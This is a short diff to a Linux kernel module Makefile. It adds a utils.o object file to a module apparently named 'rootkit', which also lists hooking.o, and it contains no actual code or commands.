@@ -1,2 +1,2 @@
-rootkit-objs    := rootkit-main.o hooking.o
+rootkit-objs    := rootkit-main.o hooking.o utils.o
 obj-m           := rootkit.o
